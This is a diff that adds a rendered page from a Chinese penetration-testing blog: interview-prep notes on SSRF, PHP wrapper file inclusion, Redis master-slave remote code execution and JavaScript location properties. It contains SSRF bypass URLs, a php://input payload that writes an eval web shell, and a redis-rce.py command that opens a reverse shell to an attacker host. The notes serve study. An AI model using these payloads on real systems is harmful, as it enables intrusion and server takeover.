@@ -1,37 +1,865 @@
-{% extends '_layout.swig' %}
-{% import '_macro/post.swig' as post_template %}
-{% import '_macro/sidebar.swig' as sidebar_template %}
+<!DOCTYPE html>
 
 
-{% block title %}{{ page.title }} | {{ config.title }}{% endblock %}
 
-{% block page_class %}page-post-detail{% endblock %}
+  
 
 
-{% block content %}
+<html class="theme-next gemini use-motion" lang="zh-CN">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/128x128.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/32x32.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/16x16.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Hexo, NexT" />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="SSRF的利用发现直接不提了 功能： 内网端口刺探  内网http流量带出  任意文件下载，可能的利用，在curl导致    支持的伪协议若由curl导致的SSRF，则其支持的伪协议有 dict, file, ftp, ftps, gopher, http, https, imap, imaps, ldap, pop3, pop3s, rtsp, scp, sftp, smtp, smtps, t">
+<meta property="og:type" content="article">
+<meta property="og:title" content="一些面试题的了解">
+<meta property="og:url" content="http://laker.xyz/2020/02/17/%E4%B8%80%E4%BA%9B%E9%9D%A2%E8%AF%95%E9%A2%98%E7%9A%84%E4%BA%86%E8%A7%A3/index.html">
+<meta property="og:site_name" content="laker&#39;s Blog">
+<meta property="og:description" content="SSRF的利用发现直接不提了 功能： 内网端口刺探  内网http流量带出  任意文件下载，可能的利用，在curl导致    支持的伪协议若由curl导致的SSRF，则其支持的伪协议有 dict, file, ftp, ftps, gopher, http, https, imap, imaps, ldap, pop3, pop3s, rtsp, scp, sftp, smtp, smtps, t">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://laker.xyz/2020/02/17/%E4%B8%80%E4%BA%9B%E9%9D%A2%E8%AF%95%E9%A2%98%E7%9A%84%E4%BA%86%E8%A7%A3/1581943216814.png">
+<meta property="og:image" content="http://laker.xyz/2020/02/17/%E4%B8%80%E4%BA%9B%E9%9D%A2%E8%AF%95%E9%A2%98%E7%9A%84%E4%BA%86%E8%A7%A3/1581943469141.png">
+<meta property="og:image" content="http://laker.xyz/2020/02/17/%E4%B8%80%E4%BA%9B%E9%9D%A2%E8%AF%95%E9%A2%98%E7%9A%84%E4%BA%86%E8%A7%A3/1581944615448.png">
+<meta property="og:image" content="http://laker.xyz/2020/02/17/%E4%B8%80%E4%BA%9B%E9%9D%A2%E8%AF%95%E9%A2%98%E7%9A%84%E4%BA%86%E8%A7%A3/1581946333563.png">
+<meta property="og:image" content="http://laker.xyz/2020/02/17/%E4%B8%80%E4%BA%9B%E9%9D%A2%E8%AF%95%E9%A2%98%E7%9A%84%E4%BA%86%E8%A7%A3/1581946369514.png">
+<meta property="article:published_time" content="2020-02-17T12:36:51.000Z">
+<meta property="article:modified_time" content="2020-02-18T09:54:32.000Z">
+<meta property="article:author" content="laker">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://laker.xyz/2020/02/17/%E4%B8%80%E4%BA%9B%E9%9D%A2%E8%AF%95%E9%A2%98%E7%9A%84%E4%BA%86%E8%A7%A3/1581943216814.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '',
+    scheme: 'Gemini',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://laker.xyz/2020/02/17/一些面试题的了解/"/>
+
+
+
+
+
+  <title>一些面试题的了解 | laker's Blog</title>
+  
+
+
+
+
+
+
+
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">laker's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">记录渗透测试琐事仅仅</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/%20" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/%20" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            Archives
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/%20" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            Categories
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/%20" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            Tags
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/%20" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            About
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
 
   <div id="posts" class="posts-expand">
-    {{ post_template.render(page) }}
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://laker.xyz/2020/02/17/%E4%B8%80%E4%BA%9B%E9%9D%A2%E8%AF%95%E9%A2%98%E7%9A%84%E4%BA%86%E8%A7%A3/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="laker's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">一些面试题的了解</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2020-02-17T20:36:51+08:00">
+                2020-02-17
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h3 id="SSRF的利用"><a href="#SSRF的利用" class="headerlink" title="SSRF的利用"></a>SSRF的利用</h3><p>发现直接不提了</p>
+<h5 id="功能："><a href="#功能：" class="headerlink" title="功能："></a>功能：</h5><ol>
+<li><p>内网端口刺探</p>
+</li>
+<li><p>内网http流量带出</p>
+</li>
+<li><p>任意文件下载，可能的利用，在curl导致</p>
+<p><img src="/2020/02/17/%E4%B8%80%E4%BA%9B%E9%9D%A2%E8%AF%95%E9%A2%98%E7%9A%84%E4%BA%86%E8%A7%A3/1581943216814.png" alt="1581943216814"></p>
+</li>
+</ol>
+<h5 id="支持的伪协议"><a href="#支持的伪协议" class="headerlink" title="支持的伪协议"></a>支持的伪协议</h5><p>若由curl导致的SSRF，则其支持的伪协议有 dict, file, ftp, ftps, gopher, http, https, imap, imaps, ldap, pop3, pop3s, rtsp, scp, sftp, smtp, smtps, telnet, tftp 。我们再来看几个常见的，例如 dict 字典协议，这个协议可以获取到指定端口的一些信息。</p>
+<p>具体可使用curl -V查看（php）</p>
+<p>若在JAVA </p>
+<p>从<code>import sun.net.www.protocol</code>可以看到，支持以下协议</p>
+<blockquote>
+<blockquote>
+<pre><code> **file ftp mailto http https jar netdoc**
+</code></pre>
+<p>如果发起网络请求的类是带HTTP开头，那只支持HTTP、HTTPS协议。</p>
+<p>比如：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">HttpURLConnection</span><br><span class="line">HttpClient</span><br><span class="line">Request</span><br><span class="line">okhttp</span><br></pre></td></tr></table></figure>
+
+<p>如果用以下类的方法发起请求，则支持<code>sun.net.www.protocol</code>所有协议</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">URLConnection</span><br><span class="line">URL</span><br></pre></td></tr></table></figure>
+
+<p>参照：<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/206/">https://xz.aliyun.com/t/206/</a></p>
+<p>具体原因不同的函数支持的传入参数不一致。具体代码举例跳过。</p>
+<p>SSRF正则表达式检测：</p>
+<p><strong>(?:HttpURLConnection)|(?:URLConnection)|(?:ImageIO)|(?:Request.Get)|(?:.openStream)|(?:OkHttpClient))|(?:HttpClients)</strong></p>
+</blockquote>
+</blockquote>
+<h5 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h5><ul>
+<li><p>IP进制转换（<a target="_blank" rel="noopener" href="http://2018466589)/">http://2018466589）</a></p>
+</li>
+<li><p>@前缀绕过（<a target="_blank" rel="noopener" href="http://good.com@evil.com)/">http://good.com@evil.com）</a></p>
+</li>
+<li><p>DNS解析绕过(<a target="_blank" rel="noopener" href="http://good.com.xip.io/">http://good.com.xip.io</a>/)</p>
+</li>
+</ul>
+<p><img src="/2020/02/17/%E4%B8%80%E4%BA%9B%E9%9D%A2%E8%AF%95%E9%A2%98%E7%9A%84%E4%BA%86%E8%A7%A3/1581943469141.png" alt="1581943469141"></p>
+<h3 id="PHP伪协议"><a href="#PHP伪协议" class="headerlink" title="PHP伪协议"></a>PHP伪协议</h3><p>应该说这里的利用属于任意文件包含内容</p>
+<p><img src="/2020/02/17/%E4%B8%80%E4%BA%9B%E9%9D%A2%E8%AF%95%E9%A2%98%E7%9A%84%E4%BA%86%E8%A7%A3/1581944615448.png" alt="1581944615448"></p>
+<p>这里不提直接包含法（利用其它文件上传+包含点形成shell   使用zip或者phar伪协议即可）</p>
+<h4 id="allow-url-include-On"><a href="#allow-url-include-On" class="headerlink" title="allow_url_include=On"></a>allow_url_include=On</h4><h4 id="allow-url-fopen-On"><a href="#allow-url-fopen-On" class="headerlink" title="allow_url_fopen=On"></a>allow_url_fopen=On</h4><p>​    data://text/plain,<?php phpinfo();?></p>
+<p>​    test/plain, 后面的值会被当做php代码执行</p>
+<h4 id="allow-url-include-On-1"><a href="#allow-url-include-On-1" class="headerlink" title="allow_url_include=On"></a>allow_url_include=On</h4><h4 id="allow-url-fopen-Off"><a href="#allow-url-fopen-Off" class="headerlink" title="allow_url_fopen=Off"></a>allow_url_fopen=Off</h4><p>先使用php://input在POST的body写为  &lt;?php fputs(fopen(‘/root/hello/shell.php’,’w’),’&lt;?php @eval($_POST[v]);?&gt;’)?&gt;   </p>
+<p>在使用filter连接该php来执行（不用知道网站绝对路径）</p>
+<p>PS: 将POST输入流当做PHP代码执行。其只受   allow_url_include参数的影响，allow_url_fopen开关与此伪协议无关。</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#file</span></span><br><span class="line">http:<span class="comment">//xxxxx/test.php?file=file:///root/hello/shell.php</span></span><br><span class="line"><span class="meta">#php:<span class="comment">//filter</span></span></span><br><span class="line">http:<span class="comment">//xxxxx/test.php?file=php://filter/resource=/root/hello/shell.php</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="allow-url-include-Off"><a href="#allow-url-include-Off" class="headerlink" title="allow_url_include=Off"></a>allow_url_include=Off</h4><h4 id="allow-url-fopen-On-1"><a href="#allow-url-fopen-On-1" class="headerlink" title="allow_url_fopen=On"></a>allow_url_fopen=On</h4><p>只能使用　php://filter伪协议来读文件再进行下一步了。</p>
+<h3 id="Redis主从复制"><a href="#Redis主从复制" class="headerlink" title="Redis主从复制"></a>Redis主从复制</h3><p>假设只有redis服务，没有ssh等服务（docker），比起以前的写文件利用方式来说，这种利用方式更为通用，危害也更大。</p>
+<h5 id="主从复制："><a href="#主从复制：" class="headerlink" title="主从复制："></a>主从复制：</h5><p>主从模式就是指使用一个redis实例作为主机，其他实例都作为备份机，其中主机和从机数据相同，而从机只负责读，主机只负责写，通过读写分离可以大幅度减轻流量的压力，算是一种通过牺牲空间来换取效率的缓解方式。</p>
+<h5 id="模块功能"><a href="#模块功能" class="headerlink" title="模块功能"></a>模块功能</h5><p>在Reids 4.x之后，Redis新增了模块功能，通过外部拓展，可以实现在redis中实现一个新的Redis命令，通过写c语言并编译出.so文件</p>
+<p>要求   <strong>在redis.conf文件里关闭保护模式</strong></p>
+<p>redis-cli -h 192.168.119.155</p>
+<blockquote>
+<p>redis command:》slaveof 192.168.119.158 6379</p>
+</blockquote>
+<p>连接redis表明主从状态</p>
+<p>利用  直接脚本编译拿回显shell</p>
+<p>git clone <a target="_blank" rel="noopener" href="https://www.lizenghai.com/archives/https%3A%2F%2Fgithub.com%2FRicterZ%2FRedisModules-ExecuteCommand">https://github.com/RicterZ/RedisModules-ExecuteCommand</a></p>
+<p>make</p>
+<p>生成so文件（模块功能）</p>
+<p><img src="/2020/02/17/%E4%B8%80%E4%BA%9B%E9%9D%A2%E8%AF%95%E9%A2%98%E7%9A%84%E4%BA%86%E8%A7%A3/1581946333563.png" alt="1581946333563"></p>
+<p>git clone <a target="_blank" rel="noopener" href="https://github.com/Ridter/redis-rce">https://github.com/Ridter/redis-rce</a></p>
+<p>然后执行exp脚本</p>
+<p>python redis-rce.py -r 192.168.119.155 -L 192.168.119.158 -f module.so</p>
+<p><img src="/2020/02/17/%E4%B8%80%E4%BA%9B%E9%9D%A2%E8%AF%95%E9%A2%98%E7%9A%84%E4%BA%86%E8%A7%A3/1581946369514.png" alt="1581946369514"></p>
+<p>默认反弹在-L参数的4444端口  使用nc接shell就行。</p>
+<h3 id="location-href-search-hash区别"><a href="#location-href-search-hash区别" class="headerlink" title="location.href   .search   .hash区别"></a>location.href   .search   .hash区别</h3><p>.href  取全部的连接</p>
+<p>.search  取?以及后面的部分</p>
+<p>.hash   取#以及#后面的部分（不经过服务器）</p>
+
+      
+    </div>
+    
+    
+    
+
+    <div>
+    
+        
+<div class="my_post_copyright">
+  <script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
+
+  <!-- JS库 sweetalert 可修改路径 -->
+  <script type="text/javascript" src="https://code.jquery.com/jquery-3.2.1.min.js"></script>
+  <script src="https://cdn.bootcss.com/sweetalert/2.1.2/sweetalert.min.js"></script>
+  <link rel="stylesheet" type="text/css" href="https://cdn.bootcss.com/sweetalert/1.1.2/sweetalert.min.css">
+
+  <p><span>本文标题:</span>一些面试题的了解</a></p>
+  <p><span>文章作者:</span></a></p>
+  <p><span>发布时间:</span>2020年02月17日 - 20:36:51</p>
+  <p><span>最后更新:</span>2020年02月18日 - 17:54:32</p>
+  <p><span>原始链接:</span><a href="/2020/02/17/%E4%B8%80%E4%BA%9B%E9%9D%A2%E8%AF%95%E9%A2%98%E7%9A%84%E4%BA%86%E8%A7%A3/" title="一些面试题的了解">http://laker.xyz/2020/02/17/%E4%B8%80%E4%BA%9B%E9%9D%A2%E8%AF%95%E9%A2%98%E7%9A%84%E4%BA%86%E8%A7%A3/</a>
+    <span class="copy-path"  title="点击复制文章链接"><i class="fa fa-clipboard" data-clipboard-text="http://laker.xyz/2020/02/17/%E4%B8%80%E4%BA%9B%E9%9D%A2%E8%AF%95%E9%A2%98%E7%9A%84%E4%BA%86%E8%A7%A3/"  aria-label="复制成功！"></i></span>
+  </p>
+  <p><span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="https://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank" title="Attribution-NonCommercial-NoDerivatives 4.0 International (CC BY-NC-ND 4.0)">署名-非商业性使用-禁止演绎 4.0 国际</a> 转载请保留原文链接及作者。</p>
+</div>
+<script>
+    var clipboard = new Clipboard('.fa-clipboard');
+    clipboard.on('success', $(function(){
+      $(".fa-clipboard").click(function(){
+        swal({
+          title: "",
+          text: '复制成功',
+          html: false,
+          timer: 500,
+          showConfirmButton: false
+        });
+      });
+    }));
+</script>
+
+    
+    </div>
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2020/01/14/Redis%E9%85%8D%E7%BD%AE-Ubuntu/" rel="next" title="毕设环境-Redis配置-Ubuntu">
+                <i class="fa fa-chevron-left"></i> 毕设环境-Redis配置-Ubuntu
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2020/03/06/%E8%B5%84%E4%BA%A7%E6%90%9C%E9%9B%86%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/" rel="prev" title="资产搜集方式总结">
+                资产搜集方式总结 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
 
     <div class="post-spread">
-      {% if theme.jiathis %}
-        {% include '_partials/share/jiathis.swig' %}
-      {% elseif theme.baidushare %}
-        {% include '_partials/share/baidushare.swig' %}
-      {% elseif theme.add_this_id %}
-        {% include '_partials/share/add-this.swig' %}
-      {% elseif theme.duoshuo_shortname and theme.duoshuo_share %}
-        {% include '_partials/share/duoshuo_share.swig' %}
-      {% endif %}
+      
     </div>
   </div>
 
-{% endblock %}
 
-{% block sidebar %}
-  {{ sidebar_template.render(true) }}
-{% endblock %}
+          </div>
+          
 
-{% block script_extra %}
-  {% include '_scripts/pages/post-details.swig' %}
-{% endblock %}
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name"></p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/%20%7C%7C%20archive">
+              
+                  <span class="site-state-item-count">44</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                
+                  <span class="site-state-item-count">6</span>
+                  <span class="site-state-item-name">tags</span>
+                
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-block">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                Links
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://blog.th3wind.xyz" title="th3wind" target="_blank">th3wind</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://damit5.com/" title="damit5" target="_blank">damit5</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#SSRF%E7%9A%84%E5%88%A9%E7%94%A8"><span class="nav-number">1.</span> <span class="nav-text">SSRF的利用</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%8A%9F%E8%83%BD%EF%BC%9A"><span class="nav-number">1.0.1.</span> <span class="nav-text">功能：</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%94%AF%E6%8C%81%E7%9A%84%E4%BC%AA%E5%8D%8F%E8%AE%AE"><span class="nav-number">1.0.2.</span> <span class="nav-text">支持的伪协议</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E7%BB%95%E8%BF%87"><span class="nav-number">1.0.3.</span> <span class="nav-text">绕过</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#PHP%E4%BC%AA%E5%8D%8F%E8%AE%AE"><span class="nav-number">2.</span> <span class="nav-text">PHP伪协议</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#allow-url-include-On"><span class="nav-number">2.1.</span> <span class="nav-text">allow_url_include&#x3D;On</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#allow-url-fopen-On"><span class="nav-number">2.2.</span> <span class="nav-text">allow_url_fopen&#x3D;On</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#allow-url-include-On-1"><span class="nav-number">2.3.</span> <span class="nav-text">allow_url_include&#x3D;On</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#allow-url-fopen-Off"><span class="nav-number">2.4.</span> <span class="nav-text">allow_url_fopen&#x3D;Off</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#allow-url-include-Off"><span class="nav-number">2.5.</span> <span class="nav-text">allow_url_include&#x3D;Off</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#allow-url-fopen-On-1"><span class="nav-number">2.6.</span> <span class="nav-text">allow_url_fopen&#x3D;On</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Redis%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6"><span class="nav-number">3.</span> <span class="nav-text">Redis主从复制</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6%EF%BC%9A"><span class="nav-number">3.0.1.</span> <span class="nav-text">主从复制：</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%A8%A1%E5%9D%97%E5%8A%9F%E8%83%BD"><span class="nav-number">3.0.2.</span> <span class="nav-text">模块功能</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#location-href-search-hash%E5%8C%BA%E5%88%AB"><span class="nav-number">4.</span> <span class="nav-text">location.href   .search   .hash区别</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">laker</span>
+
+  
+</div>
+
+
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+
+
+
+    <br>
+    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span id="busuanzi_container_site_pv">本站总访问量<span id="busuanzi_value_site_pv"></span>次</span>
+    <span class="post-meta-divider">|</span>
+    <span id="busuanzi_container_site_uv">本站访客数<span id="busuanzi_value_site_uv"></span>人</span>
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
